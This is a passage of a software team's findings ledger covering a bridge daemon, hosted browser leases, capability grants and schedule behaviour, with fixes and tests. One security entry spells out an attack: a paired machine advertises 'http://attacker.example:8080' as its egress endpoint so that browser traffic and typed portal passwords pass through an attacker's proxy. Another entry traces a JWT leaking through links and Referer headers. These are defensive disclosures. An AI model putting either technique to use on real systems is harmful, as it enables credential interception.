  `sendToPairing` resolves to "the frame was written to a live socket", and `requestAttendedCeremony`
  treats that as the ceremony having started: it records the pending ceremony and the route answers
  `started: true` / `waiting_login`, i.e. "a browser is opening on your machine". Observed for real:
  a `POST /integrations/citius/session` returned `started: true`, the daemon's own log shows the
  socket went `reconnecting` -> `open` moments later, and the frame appears NOWHERE in that log. The
  write succeeded into a socket that died before delivery; the ceremony then sat open for its full
  10-minute TTL and expired. A second POST on a stable link was delivered and ran correctly, so this
  is transport churn, not the protocol gap fixed in `6186418`.
  This is the SAME SHAPE as that bug one layer down: a success value that is true about this
  process's action and silent about the outcome the user was promised. It matters more on a laptop
  over a relay (sleep/wake, DERP) than on a wired peer, which is exactly where the card readers are.
  THE FIX: the ceremony needs an ack. The daemon already knows when it has accepted an
  `attended.request` (it logs and opens the browser), so an `attended.ack { requestId }` frame is
  additive under Rule 7, and `requestAttendedCeremony` should hold the ceremony as `pending` until
  it arrives, with a short timeout that reports honestly rather than a `started: true` that outlives
  the socket. Re-delivery on reconnect is the larger version and is NOT proposed here: a ceremony
  needs a human at the machine now, so replaying one minutes later asks at a moment nobody is
  standing there (`bridge/attended.ts` already refuses queueing for that reason).

- **`artifact-card-link-carries-the-platform-jwt`** (OPEN 2026-08-15, HIGH, security - found by
  the 2026-08-15 model code review of the uncommitted working tree; belongs to the artifact-URL
  session, recorded here so the migration does not land on top of it silently). The artifacts
  surface (`web/components/artifacts/artifacts-surface.tsx` `getArtifactAppUrl`) appends the
  owner's FULL platform JWT as `?token=` to every non-shareable artifact's card link - a visible,
  copyable anchor, no longer confined to the sandboxed preview iframe (whose own comment
  explicitly avoided this: "skip the ?token= append so we don't leak the JWT into browser
  history / referrers"). "Copy link address" or forwarding the URL hands the recipient a reusable
  platform JWT valid against any API endpoint. COMPOUNDED BY the same tree's Referrer-Policy
  relaxation on `/apps` documents (`api/src/security-headers.ts` no-referrer -> same-origin):
  with the JWT in the document URL, every same-origin subresource and `/api/*` call carries
  `Referer: ...?token=<JWT>` - and `design-tokens.ts` reads `req.headers.referer`, so the JWT
  lands verbatim in logs. The `serving.ts` 302 token-strip covers only purpose-scoped preview
  tokens, so the JWT stays in the document URL. FIX DIRECTION (needs the feature author's
  intent): mint the existing purpose-scoped, server-stripped preview token for the card link
  instead of the raw JWT, and restore `no-referrer` (the design-tokens Referer dependency then
  needs its app identity from a query/header instead). NOT fixed in the migration run: it is the
  in-flight feature of another session; reworking its auth model blind risks breaking intent.
  The salomao ERP will serve on this exact surface, so this blocks the customer cutover.

- **`review-findings-2026-08-15-carryover`** (OPEN 2026-08-15, MEDIUM, ledgered so the review's
  remaining confirmed findings are closed deliberately, never silently). From the same
  code review of the uncommitted tree, all in the previous session's work: (a)
  `resolveBrandCanvas` (`api/src/services/design-tokens.ts`) picks the canvas by raw swatch
  count among luminance extremes, so a dark brand whose white TEXT swatches dominate is
  classified LIGHT - it fails on the committed `scripts/seed/branding.json` fixture itself
  (#ffffff count=162 from text/buttons vs #080c14 count=7, instructions say "Ambiente escuro");
  weight by source class (background-ish sources over text-ish) or honour the instructions
  field. (b) `usedCitations` (`api/src/apps/app-assistant.ts`) filters citations by `[n]`
  markers in the prose but the panel renders an UNNUMBERED Fontes list: markers dangle,
  `[1, 2]` multi-ref form does not match, a paraphrased unmarked reply silently loses ALL
  citations, and bracketed indexes in code snippets false-match. (c) chat-kind grounding
  (`api/src/knowledge/grounding.ts`) gates the shared legal corpus on a finite keyword list -
  legal questions without a listed keyword ("divórcio", "herança" are absent) silently lose
  the corpus with no few-hits fallback. (d) `listenerStamp` (`api/src/events/service.ts`,
  migration S2): platform triggers created in an org with NO platform connection poll forever
  on a 300s-capped backoff (no auto-disable), and any platform-provider trigger row created
  BEFORE the inference stays webhook-kind and silently dead - acceptable pre-cutover (no such
  fleet exists), but a boot-time reconcile or a create-time connection check should land before
  triggers are exposed to customers. Each item ends FIXED or NOT-NEEDED with a reason; none
  may be dropped by inertia.

- **`salomao-vision-pass-2026-08-15`** (LEDGERED 2026-08-15, discovery layer - the fine-comb
  vision pass over the freshly imported `legal-case-manager-3` instance on the dev stack: 8
  browser lanes, every module + public surfaces + mobile spot-check, screenshots read and
  judged; evidence under the session scratchpad `vision/` dirs, full per-lane reports in the
  `salomao-erp-vision-pass` workflow output). Per the QA process every item below ends in a
  deterministic test or a written dismissal - dispositions stated now, none silently dropped.
  The migration itself came out CLEAN: all 1,627 rows render with real content and zero
  mojibake, the 91 migrated documents open (blob+sidecar plane proven end-user-visible), the
  M365-degrade is mostly graceful (Captacao shows an honest retry card), and dashboard numbers
  reconcile with the REST plane. The pass found APP-level defects (present on prod today, not
  migration regressions) plus data-hygiene items:
  FIX-IN-FLIGHT (same-day fix wave, each verified in-browser + spec'd): (1) BLOCKER - client
  Documentos delete is one unconfirmed click, irreversibly destroying the blob (a real
  document was destroyed by the QA lane's misclick and fully restored - row re-created, blob
  re-copied via the idempotent `migrate-app-files.mjs` re-run, serving 200 again; the incident
  is itself the proof of the restore path). In-app confirm dialog + separated affordances.
  (2) HIGH - pt-PT money misparse in aggregates: digit-stripping turns '100.000,00' into 10
  million; Relatorios VALOR EM PIPELINE showed EUR 10 041 350 where the true sum is ~141k,
  Funil column totals inflated ~100x. One shared parser + one pt-PT formatter. (3) HIGH -
  React duplicate-key errors: Clientes/Auditoria lists keyed by non-unique business codes
  (real data holds duplicate client codes and a millisecond-collision LOG code); key by
  record id. (4) HIGH - login screen does not reflow at 390px (form clipped past the
  viewport, container overflow:hidden).
  OPEN-APP (recorded for the app's next iteration with the customer; each needs a fix + spec
  or a customer sign-off dismissal): Revisao de KYC renders the same hardcoded checklist for
  every dossier, ignoring per-submission state (HIGH - compliance screen); 'Enviar ao
  cliente' under a missing M365 credential top-level-navigates the SPA into a bare error page
  (HIGH - degrade UX); proposal Estado vocabulary drift ('Proposta enviada'/'Aprovada'
  invisible to filter + Relatorios counts); list VALOR never recomputed from items (18x off
  on a real signed-in-progress proposal); Clientes list badges contradict detail pages
  (denormalized counts); Projetos progress ignores atividade_status overrides; client
  'Atividade' tab shows a canned identical timeline; Distribuicao chart renders 0px tall on
  Dashboard de Atividades; Auditoria renders raw user tokens/UUIDs for ~30% of rows; unknown
  hash routes silently render the Dashboard; funnel 'Ganho' column permanently 0; KYC tab
  state contradictions; risk band never surfaced in review; Master approve/nao-aprova
  inconsistency; internal build-slice jargon (S12/S13/S14) visible in customer-facing UI;
  date/CSV/locale nits; sticky Zoho bar overlap; a11y names on Construtor buttons.
  OPEN-DATA-HYGIENE (operator + customer decisions at cutover; the prod dump carries all of
  it - verified pre-existing upstream, NOT introduced by the import, row counts match the
  dump exactly): duplicated client codes (BSM-2026-0001 x3 + 5 exact duplicate pairs), junk
  row 'dfdffddggdhd' in atividades, test/probe accounts holding Master role (Probe, Teste
  Ekoa, Bazinga Da Costa, CRM Master), SharePoint integration pointed at the throwaway
  bazingadas.sharepoint.com tenant instead of the customer's, platform-e2e residue rows,
  LOG-code generator collisions, PT-BR/PT-PT spelling drift in template content. These go on
  the cutover runbook's pre-flight checklist as a customer-blessed cleanup, never a silent
  edit.
  ENV-NOTED (no action): PWA manifest absent (tracked parity row - installed-PWA users lose
  their entry until ported); Zoho not connected on dev (send refusal correct); model
  credential works (AI features live).

- **`bridge-pdfjs-major-declares-node-22-while-the-package-pins-node-20`** (OPEN 2026-08-18, MEDIUM,
  latent runtime - found while moving the daemon into `clients/bridge`, pre-existing in its own
  repository). `clients/bridge` depends on `pdfjs-dist ^6.1.200`, which resolves to a build whose
  own `engines` field declares `node >=22.13.0 || >=24`. The package is pinned to Node 20
  (`.nvmrc`, `engines: >=20 <21`), so `npm i -g` of the shipped tarball prints an EBADENGINE warning
  and installs anyway - npm does not enforce engines by default. Nothing in the suite catches it:
  the PDF path (`src/tools/extract-text.ts`, `await import('pdfjs-dist/legacy/build/pdf.mjs')`) is
  exercised only where the legacy build happens to work on Node 20 today, so the failure mode is a
  future pdfjs patch using a Node 22 API and breaking text extraction on operators' laptops with no
  gate having gone red. Compounding it, `api/` pins `pdfjs-dist ^4.10.38`, so the monorepo now
  carries TWO pdfjs copies (the bridge's nests under `clients/bridge/node_modules`). Disposition:
  NOT fixed in the move - aligning them means either downgrading the daemon's extraction to v4 or
  bumping api's to v6, and neither is a move. The real fix is one range across both workspaces,
  chosen against a Node-20 runtime, with the extraction path pinned by a test that actually reads a
  PDF on the pinned Node version.

- **`capability-grants-have-no-production-caller-so-every-daemon-step-is-refused`** (OPEN 2026-08-19,
  HIGH, product-blocking - found while fixing the credential-before-grant ordering in
  `bridge/daemon-step-seam.ts`). `bridge/capability-grants.ts` is default-deny (I-3) by design, and
  `grantCapability`, `revokeCapability`, `grantedCapabilities` and `usableCapabilities` have ZERO
  callers outside `api/tests/` - no route, no service, no admin surface, nothing in `web/`. Verified
  by grep across `api/src`, `web/` and `shared/src`. The consequence is total rather than partial:
  with the grant now read before delivery, EVERY daemon-executed step - browser and bash, with or
  without `envRefs` - is refused, because no org can express a grant. Before this change the same
  fact was masked, in the worst way: an `envRefs`-bearing step decrypted a Cofre item and shipped
  the plaintext to the machine before hitting the same refusal, so the path looked partly alive.
  NOT FIXED HERE, deliberately: an admin surface for granting a capability on a machine is a
  product decision (who may grant, per-org vs per-owner, what the UI says, whether granting is
  audited through `bridge/audit.ts`) and inventing one inside a security fix would ship an
  authorisation surface nobody reviewed. What this change does guarantee is that the failure is now
  a clean refusal with `retryable: false` rather than a credential disclosure followed by a refusal.
  The fix is a versioned, audited grant/revoke endpoint plus the machine-detail UI that calls it,
  with an isolation suite of the class of `api/tests/security/capability-grants.test.ts` proving a
  grant made in one tenant is unreadable in another.

- **`bridge-ingress-name-leg-reformats-json-stdout`** (OPEN 2026-08-19, LOW, cosmetic - noted while
  extending ingress redaction to the `tool.result` observation object). `redactStream`'s
  name-pattern leg (`redactBodyByName`) re-serialises any string that parses as JSON with
  `JSON.stringify(..., null, 2)`. That behaviour predates this change and already applied to
  `delegation_result.answer` and to a string-valued `tool.result.output`; extending the walk to the
  observation object means a bash step whose stdout is compact JSON now has that stdout
  pretty-printed in the persisted step record. NOT a correctness or security problem - the bytes
  are equivalent JSON and nothing joins on them - but it is a visible difference in recorded output
  and it is recorded here rather than discovered later as a mystery. The narrow fix is to re-emit
  the parsed tree with the ORIGINAL separators when nothing was actually masked; the broad one is to
  make the name leg return the input unchanged when it made no substitution. Neither belongs in a
  security fix, and both need a test that pins byte-identical passthrough for untouched output.
- **`no-queue-timeout-for-a-second-run-on-one-browser-profile`** (OPEN 2026-08-19, LOW, throughput -
  introduced by the run-scoped browser lease, deliberately). `ProfileManager.acquire` serialises per
  `profileId`, and with the lease now held for a whole RUN rather than a single `tool.invoke`, a
  second run targeting the same profile waits for the first to finish instead of interleaving with
  it. That is the correct semantics - one browser, one cookie jar, one Chromium singleton, and the
  interleaving it replaces was two runs corrupting each other's page - but the wait is UNBOUNDED
  except by the run-idle backstop (2 min after the first run's last step). A first run that keeps
  stepping for an hour blocks the second for an hour, and the second run has no way to say "I gave
  up": it simply sits in `acquire` until its own hosted invocation timeout fires, at which point
  Cortex reports "the machine did not answer in time" - which is true but names the wrong cause.
  Disposition: NOT fixed here. The right fix is a bounded wait in `withRunLease` that fails the step
  with a named "another run is using this profile" error, and it needs a decision about the bound
  (whether it should exceed Cortex's invocation timeout so the honest message wins the race, or sit
  under it) plus a wire-visible error the run UI can render. Out of scope for the lease fix, and
  today it is reachable only for two concurrent automations sharing one integration profile.

- **`daemon-run-lease-has-no-live-headed-chrome-verification`** (OPEN 2026-08-19, MEDIUM, coverage -
  a standing gap, not a regression). Every assertion about the run-scoped lease, the `release` verb,
  the idle backstop, the dangling-symlink `SingletonLock` recovery and the close-before-relaunch
  ordering runs against the INJECTED launcher and structural page/context fakes. That is the same
  discipline the profile suite already documents - the real launch is HEADED and cannot run on a box
  with no display, and this box has none - so the following remain unverified against a real browser:
  (a) that Chrome's actual `SingletonLock` on this platform is the dangling symlink the recovery now
  handles (the test builds one by hand from the documented shape, it does not observe one);
  (b) that a real `BrowserContext` survives being held across a multi-minute run without Playwright
  reaping the page; (c) that `clearCookies()` on a real PERSISTENT context removes the on-disk jar
  rather than only the in-memory one - which is what the run-end session guarantee rests on;
  (d) end-to-end, that a real navigate-then-click on a real site now lands on the same page; and
  (e) that the 45s keepalive against the 2-minute idle window holds a REAL run open across a
  `pause_for_user` CAPTCHA solve - the case the keepalive exists for, and the one where being wrong
  closes the browser in front of the person using it. Closing this needs the live-verification pass
  on a machine with a display, per the playbook in `docs/testing.md`; it is not closable from CI and
  is not claimed to be.

- **`suite-ledger-unit-census-red-on-main-59-registered-64-on-disk`** (OPEN 2026-08-19, MEDIUM, gate -
  PRE-EXISTING, not introduced here, and deliberately not fixed here). `npm run gate:ledger` fails
  its census: `frontend unit files on disk: 64 (ledger: 59)`. The spec census (83/83) and driver
  census (29/29) are clean; only the frontend-unit band has drifted. Five `web/__tests__/` files were
  added without the ledger entry the census requires, which is exactly the omission the census exists
  to catch, so the gate is doing its job. Attribution: this branch touches neither `web/` nor
  `api/tests/SUITE_LEDGER.json`, so the count is byte-identical to main; the unregistered names in
  the DUE list (`schedules-store`, `schedules-recurrence-text`, `chat-runtime`,
  `chat-panel-composer`, `chat-error-retry`, `chat-stripes-featured`, `lib/file-picker`,
  `lib/artifact-app-url`, `components/sync-outcome-panel`, ...) belong to the web/chat/schedules
  streams. Disposition: NOT fixed from this branch. Registering them means choosing a gate band per
  spec, which is a judgement the owning stream has to make, and editing `SUITE_LEDGER.json` while
  those streams are in flight would collide with them. It needs to be closed by whoever owns those
  specs, before the per-PR lane can be green.

- **`engine-finally-comment-still-says-the-daemon-session-dispose-is-a-no-op`** (FIXED 2026-08-19,
  LOW, stale comment). `api/src/automation/engine.ts`'s run `finally` read "The daemon session is a
  no-op (the daemon owns the page lifecycle)", which was true before the run-scoped lease and false
  after it. The follow-up pass rewrote that `finally` anyway - it is now where the call tree's
  browser lease is released (`releaseBrowserLease`, once, by the pass that minted the lease) - so
  the comment was replaced with what actually happens, including why each of the two conditions on
  the release is load-bearing. Pinned by `api/tests/automation/engine-sub-automation-lease.test.ts`.

- **`daemon-pidfile-is-released-before-the-browsers-have-finished-closing`** (FIXED 2026-08-19,
  LOW, race). `serve`'s shutdown called `removeDaemonPid(home)` before the browser teardown had
  completed. The pidfile is the CROSS-PROCESS lock on the profile directory - `profile.ts`'s header
  rests its "an in-process mutex is sufficient" argument on it - so for the duration of the teardown
  a second `serve` on the same home was allowed to start and could launch Chromium against a
  `userDataDir` the dying daemon had not released: the SingletonLock collision the lock exists to
  prevent. It was recorded rather than fixed because "the ordering lives inside `serve()`'s
  signal-handler closure and cannot be asserted without extracting the whole shutdown sequence into
  a named unit". The adversarial review of the lease change forced exactly that extraction
  (`installShutdown`, so the SIGINT/SIGTERM wiring is testable at all), which made the fix cheap:
  the pidfile now comes off AFTER `teardownBrowsers` resolves - or after its 10s deadline passes,
  because past that point holding it would only prevent a restart. Pinned by
  `test/cli/serve-teardown.test.ts` ("holds the pidfile until the profiles are actually free", plus
  the timeout case).

- **`api-suite-exits-1-on-chokidar-EMFILE-while-every-test-passes`** (OPEN 2026-08-19, HIGH, gate -
  PRE-EXISTING and flaky, not introduced here). `npm test` fails at the `@ekoa/api` workspace with
  `npm error code 1` while reporting `374 passed | 2 skipped` and ZERO failed tests. The exit code
  comes from vitest's UNHANDLED-ERROR channel: a burst of
  `Error: EMFILE: too many open files, watch '/tmp/ekoa-fam-sbx-*/user-*/id_*/manifest.json'`,
  raised by the chokidar watcher `api/src/apps/app-registry.ts` `startWatcher` opens per registered
  app (`manifest.json` + the dist dir). It surfaces through `tests/contract/artifact-family.test.ts`,
  which registers many apps; that test passes 32/32 when run ALONE, so the exhaustion is the whole
  374-file suite's parallel workers sharing this box's inotify budget
  (`fs.inotify.max_user_instances = 128`), not one test misbehaving.
  ATTRIBUTION, measured rather than assumed: the error COUNT is unstable across identical runs (20,
  then 19, then 126), and a full api run with this branch's only new api test file REMOVED still
  exits 1 with 126 errors and 252 EMFILE lines - i.e. it is worse without the change than with it.
  This branch touches no file in `api/src/apps/`. Two candidate fixes, neither attempted here: raise
  `fs.inotify.max_user_instances` on the runner (masks it), or have the app registry not hold a
  persistent watcher per app in a test process - the watcher exists for dev-serve rebuilds and has
  no purpose under a contract suite, so gating `startWatcher` on the dev-serve path is the real fix.
  Until then `npm test` cannot be green on this box, and every agent reporting a green run should be
  read as "all tests passed, the process still exited 1".

- **`daemon-lease-keepalive-costs-one-frame-and-one-ledger-row-per-45s-of-live-run`** (ACCEPTED
  2026-08-19, LOW, cost - introduced deliberately by the run-scoped lease). Every live browser lease
  is heartbeated by `DaemonBrowserSession` every 45 seconds, and each heartbeat is a signed
  `tool.invoke` that the daemon ledgers (an fsync'd append). A run paused for a human at a CAPTCHA
  for an hour writes ~80 rows. ACCEPTED rather than optimised, for two reasons. The alternative to a
  heartbeat is an idle window long enough to cover a human's think time, which is the same as no
  containment on an authenticated jar - the window is a security control, and a keepalive is what
  lets it stay at two minutes. And the rows are not noise: they are the audit record of how long
  this machine held an authenticated browser session open for a given run, which is exactly the kind
  of fact the ledger exists to hold. Revisit only if a real profile shows the fsync cost mattering.

- **`no-fence-between-a-late-release-and-a-resumed-run`** (OPEN 2026-08-19, LOW, race - narrow, and
  mitigated by design rather than closed). A run that halts on `needs_credentials` writes that state
  to the store BEFORE its `finally` runs, and the server-side observer can dispatch the resume from
  another leg the moment a credential is unlocked. So there is a window - the width of the engine's
  unwind - in which the resumed pass could take its lease before the halted pass's release lands.
  The lease id is what keeps this harmless in practice: it is minted PER PASS, so the late release
  names the OLD lease and cannot touch the resumed one; the worst outcome is the old lease being
  released twice (idempotent) or the resumed pass briefly queueing behind it on the profile mutex.
  A per-run key would have made this window fatal instead (the tombstone would refuse the resumed
  pass), which is one of the two reasons the key is per-pass. NOT closed: closing it properly means
  a fencing token on the wire, and there is no observed failure to justify one.

- **`a-daemons-self-asserted-egress-endpoint-becomes-the-hosted-browsers-proxy-unvalidated`**
  (FIXED 2026-08-19, HIGH, security - NEW on this branch, because this branch gave `proxyOptionFor`
  its first production caller). `hello.egressEndpoint` is typed on the wire as a free
  `z.string().max(255).optional()` (`shared/src/ekoa-local.ts`). `bridge/server.ts` forwarded it
  verbatim to `registerPairing`, which stored it verbatim; `egressCandidatesForOrg` intersected the
  CAPABILITIES with the org's grants - honouring I-3, "what a machine ADVERTISES is a self-assertion;
  what the org GRANTED is the authorisation" - and passed the ADDRESS through untouched. `resolveEgress`
  returned it as `proxyUrl`, `proxyOptionFor` turned it into `{server}`, and the provider called
  `browser.newContext({proxy})`.
  ATTACK. A machine in org A sends hello `{capabilities:['egress.residential'],
  egressEndpoint:'http://attacker.example:8080'}`. The admin grants `egress.residential` to that
  pairing - authorising the MACHINE, not a URL; the grant record carried no endpoint, and
  `advertisedCapabilitiesForOrg` returned capability NAMES, so the address was never shown to the
  person authorising it. The org's hosted Chromium then launches through the attacker's proxy, and if
  the step is credential-gated the typist submits the portal password through it. A compromised daemon
  could change the destination on any reconnect with NO new grant. No scheme, host, or private-range
  validation existed anywhere on the path.
  FIX, in two halves because neither is sufficient alone. (1) SHAPE: `api/src/bridge/egress-endpoint.ts`
  `normaliseEgressEndpoint` - scheme allowlist {http,https,socks5}, Playwright's short form normalised,
  no embedded credentials, no path/query/fragment, and a refusal of loopback (every spelling, including
  `[::ffff:127.0.0.1]`), the unspecified address, link-local (169.254/16 and fe80::/10 - the cloud
  metadata service, refused even under the dev switch), multicast/broadcast and RFC1918; the TAILNET
  ranges 100.64.0.0/10 and fd7a:115c:a1e0::/48 are ALLOWED BY NAME, because 100.64/10 is RFC 6598
  shared address space and a naive "reject private" rule would throw away every legitimate value.
  Applied at ingress (`bridge/server.ts`) and at both the write and the read in `bridge/registry.ts`.
  (2) AUTHORISATION: `CapabilityGrantDoc.egressEndpoint` - an `egress.residential` grant now NAMES the
  address it authorises (`grantCapability` throws `CapabilityGrantError` without a usable one), and
  `egressCandidatesForOrg` withholds both the capability and the address unless the grant's endpoint
  canonically equals what the machine currently advertises. `advertisedCapabilitiesForOrg` carries the
  advertised address so a grant surface can show what is being authorised.
  ALSO FIXED in passing: a hello with NO endpoint used to KEEP the previous one, so a machine could
  never un-offer a route it once offered. `registerPairing`'s `egressEndpoint` is now a tri-state -
  `undefined` keeps (the connect path, which is not an advertisement), `null` or an invalid address
  clears.
  REACHABILITY, honestly. `config.localBrowserEnabled` is false in production by default, so the
  hosted launch this protects is a non-prod path until an operator opens the switch; and there is no
  admin ROUTE that grants a capability at all today (`grantCapability` has no production caller), so
  no live org currently holds a grant of any kind. Both narrow the blast radius; neither is a reason
  to leave the path unguarded, and the grant surface that has not been written yet now cannot be
  written without naming the address it authorises.
  Pinned by `api/tests/security/egress-endpoint-authorisation.test.ts` (16 cases across the shape
  table, the attack, the changed-endpoint reconnect and the registry's storage rules) plus two new
  ingress cases in `api/tests/bridge/hello-advertisement.test.ts` - and one strengthened there, whose
  name claimed to assert the stored endpoint and did not. Every half was verified by mutating the
  source: dropping the grant-endpoint comparison reddens 2 cases (the attack, the reconnect); gutting
  the host policy reddens 6; restoring keep-the-previous-endpoint reddens 2.

- **`no-admin-route-grants-a-bridge-capability-at-all`** (OPEN 2026-08-19, MEDIUM, gap - recorded
  while fixing the finding above). `grantCapability` / `revokeCapability` / `grantedCapabilities`
  (`api/src/bridge/capability-grants.ts`) have NO caller outside tests: `routes/bridge.ts` mounts the
  token mint, the revoke kill switch and presence, and nothing else. So I-3's "the org GRANTED it" is
  today an authorisation nobody can actually give, which is why default-deny currently reads as
  "residential egress is unreachable in production" rather than "residential egress is authorised
  carefully". The endpoint binding above is deliberately built so that the surface, when written,
  must name the address; the surface itself is out of this branch's scope and belongs with the fleet
  page that would show `advertisedCapabilitiesForOrg`.

- **`a-neutral-block-removed-the-only-cap-on-repeating-it`** (FIXED 2026-08-19, MEDIUM, cost +
  correctness - introduced by this branch's P4.1 neutrality work). Exempting `awaiting_daemon` from
  the 20-strike `FAILURE_CEILING` was right (a shut laptop must not disable a working schedule) and
  it removed the only limit on repetition, with nothing put in its place. A per-minute schedule
  pointed at a bridge-only automation with no daemon connected fired 1440 times a day, for ever:
  ~1440 `scheduleRuns` rows plus ~1440 automation-run rows - neither store has retention - and 1440
  `schedule_blocked` notifications, so the compensating measure that tells the owner was itself the
  unbounded thing. On main the ceiling stopped it after 20 fires.
  FIX: a neutral streak COOLS the schedule rather than pausing it. `neutralBackoffMs` doubles from
  one minute to a 15-minute cap; `claimAndFire` advances the pointer past `neutralBackoffUntil`
  without claiming, so those occurrences leave no row, no run and no notification, and the schedule
  stays ENABLED and resumes by itself on the far side (streak resets on any non-neutral outcome, and
  on an owner re-enable). The notification takes the same bound: first block of a streak immediately,
  a continuing one at most daily (`lastNeutralNotifiedAt`). Counted in FIRES, which is the
  unambiguous unit: a per-minute schedule falls from 1440 blocked fires a day to ~96 - so ~192
  durable rows a day across the two stores instead of ~2880, and 2 pushes instead of 1440. The
  cost of the halt becomes
  latency, capped at 15 minutes, which is the honest price of waiting. The cap sits deliberately
  below any hand-authored cadence, so hourly and nightly schedules are unaffected, and a NON-neutral
  block is not cooled at all - slowing it would delay the auto-pause that is how its owner finds out.
  Pinned by four cases in `api/tests/schedules/supervisor.test.ts`; mutation-verified (removing the
  deferral, removing the re-notify floor, and cooling a non-neutral block each redden).

- **`neither-schedule-runs-nor-automation-runs-have-retention`** (OPEN 2026-08-19, MEDIUM, cost -
  pre-existing, surfaced while bounding the finding above). `scheduleRuns` and the automation run
  store both grow monotonically: `deleteSchedule` drops a schedule's runs and nothing else ever
  removes a row. The cooldown above bounds the RATE at which a blocked schedule writes them, which
  was the acute problem, but a healthy per-minute schedule still writes 1440 rows a day indefinitely.
  A retention policy (age or per-schedule count, with the run detail preserved on the schedule's
  `lastRun` either way) belongs with whichever slice owns operational data lifecycle; it is out of
  scope here and recorded rather than left implicit.

- **`p2-first-cut-spine-was-unreachable`** (CLOSED 2026-08-19, CRITICAL, dead-surface - closed by the
  P2 re-cut). The first cut of the discovery spine mounted a replay on the hot path but no production
  path could WRITE a recipe: the only writer was `discoverIntegrationAction`, and nothing called it.
  The replay therefore always answered `no-recipe`, and the whole slice - the goal loop, the goal
  gate, the capture arm, the heal - was added attack surface with no behaviour. Closed by making the
  ordinary automation run the learning pass (`RunAutomationOptions.observeNetwork`) and deleting the
  three modules whose only entry was the unreachable one; the reachability itself is pinned by
  `tests/automation/discovery-replay-acceptance.test.ts`, which enters at
  `executeUserIntegrationAction` rather than at any spine module, and by the mutation that removes
  the instrumentation (it turns nine assertions red across two suites). See docs/decisions.md
  2026-08-19 (b).

- **`p2-first-cut-posture-resolved-once-per-recipe`** (CLOSED 2026-08-19, HIGH, authorisation -
  a decision scoped to the wrong unit). `replay-action.ts` classified the origin of the recipe's
  FIRST call and handed that one verdict to the executor, which applied it to every call in the list.
  A recipe whose opening hop was to a `permissive` origin therefore authorised server-side egress to
  every later host it touched, including third-party ones nobody had classified. Closed by making
  `ReplayInput.classify` a FUNCTION asked per call, and by resolving the whole ladder before the
  first call is sent. Pinned in `tests/automation/injected-call-replay.test.ts` (three cases, one of
  them wired through the real `classifyOrigin`) and `tests/security/discovery-replay-isolation.test.ts`.

- **`p2-first-cut-write-gate-had-no-key`** (CLOSED 2026-08-19, HIGH, gate-that-is-not-a-gate). The
  replay's `writeAssent` was read but never set by any caller, so the write gate could not open - a
  permanent refusal that reads as protection - and scripted DOM steps replayed with no gate at all,
  in both the executor and the heal. Closed by carrying the answer `integrations/action-consent.ts`
  already produces across the automation seam (true only for `approved_once`/`approved_always`;
  `not_mutating` is NOT an assent), and by counting a page-changing scripted step as a write in both
  places. Pinned in `tests/security/integration-write-gate.test.ts` (section C),
  `tests/automation/injected-call-replay.test.ts` and `tests/automation/self-heal.test.ts`.

- **`p2-first-cut-recorder-outlived-its-lease`** (CLOSED 2026-08-19, HIGH, credential lifetime). The
  machine-side `NetworkRecorder` holds the only live header VALUES on the daemon. It was disposed on
  the two lease-ending routes that send a frame and left resident on the two that do not - the idle
  backstop and `closeAll` at shutdown - so a remembered credential survived the session it was read
  from, for the lifetime of the process. Closed with `ProfileManager.onLeaseEnd`, fired from
  `releaseRun` (the single funnel for all three routes) and registered by the recorder itself when it
  is armed. Pinned in `clients/bridge/test/browser/recorder-lifetime.test.ts`.

- **`p2-first-cut-credential-check-was-inert-in-production`** (CLOSED 2026-08-19, MEDIUM, safety
  check wired only in tests). `assertNoCredentialRodeIn` proves no live credential rode into a
  resolved URL or body, and the mount never passed the run's `SecretRegistry` - so it ran only where
  a test built one. Closed by building the registry from the run's resolved `credentialFields` in
  `runAutomationForAction` and passing it to both the replay and the engine.

- **`p2-first-cut-missing-argument-widened-the-replayed-query`** (CLOSED 2026-08-19, MEDIUM,
  fail-open). `interpolate` renders an unsupplied `{{input.ref}}` as the empty string, so a replay
  missing an argument fetched `?ref=` - "every row" on most APIs - and reported success. Closed by
  refusing any call whose template names a hole the run did not supply. Pinned at the unit level and
  in the acceptance, where the assertion is on what the fixture SERVER received.

- **`p2-first-cut-zero-model-calls-was-proved-at-one-door-of-three`** (CLOSED 2026-08-19, MEDIUM,
  unfalsifiable headline claim). The acceptance asserted "ZERO model calls" with a spy on
  `runOneShot`, one of the three functions over the chokepoint transport. Closed by counting at the
  transport itself - `streamAgent` + `oneShot` + `messages`. The mutation that demonstrates the gap
  is a `completeFast` call inserted into the replay path: the new assertion catches it, the old one
  could not have.

- **`p2-recut-in-page-replay-ran-from-a-blank-page`** (CLOSED 2026-08-19, CRITICAL, the central rung
  did not do what the design says). The whole premise of CDP call-injection is that the call executes
  INSIDE the authenticated page and inherits its cookie jar, TLS session and SameSite context. As
  built, `runInjectedCall` evaluated its script on whatever page the lease held - and a lease taken
  for a replay holds a fresh `about:blank`, in a profile whose jar `release()` wiped at the end of the
  previous run. A fetch from `about:blank` is a CROSS-SITE request from an opaque origin: SameSite
  Strict/Lax cookies are not attached, a credentialed cross-origin read needs an
  `Access-Control-Allow-Origin` echo no private API sends to a null origin, and `Origin: null` is
  itself the tell. The rung inherited nothing - a slower Node fetch wearing a browser costume, and
  every unit test stayed green because the fake page returns a canned envelope whatever the page is.
  Closed by `ensureOriginForCall` (`clients/bridge/src/browser/inject.ts`): the page is put on the
  call's own origin (the origin ROOT, never the call URL - that would issue the call as a document
  navigation) before anything is sent, and the call REFUSES if it could not get there or was
  redirected off it. PROVED, not asserted: `clients/bridge/test/browser/inject-inheritance.test.ts`
  drives the production function over a REAL Chromium against a REAL `node:http` server and asserts
  on the headers the SERVER received - a `SameSite=Strict` session cookie arrives - against a control
  issuing the identical credentialed fetch from `about:blank` on the same page, same jar, same
  browser, which does not carry it.

- **`p2-recut-learned-header-names-were-never-forwarded`** (CLOSED 2026-08-19, CRITICAL, the most
  valuable thing capture produces was dropped). `recipe.headerNames` - "which header carries the
  session" - was decorative on the production replay path. `runInjectedCallOp` resolved values from
  `recorders.get(leaseId)` and forwarded `{}` when there was none, and on a replay lease there is
  NEVER one: a replay run does not drive the automation, so nothing sends `captureOp:'start'`. Every
  unit test passed because each one handed the resolver in itself. Closed by arming a recorder for
  the replay lease BEFORE the navigation (`ensureRecorder(..., { buffer: false })`), so the site's
  own boot traffic reveals the CURRENT value of each learned name: NAMES from the recipe, VALUES from
  the live context, never values from the recipe. `buffer: false` is load-bearing - nothing drains a
  replay's recorder, so buffering there would accumulate response bodies no code path can read.
  Pinned in `clients/bridge/test/browser/replay-wiring.test.ts` (the real frame handler) and end to
  end in the real-Chromium suite above.

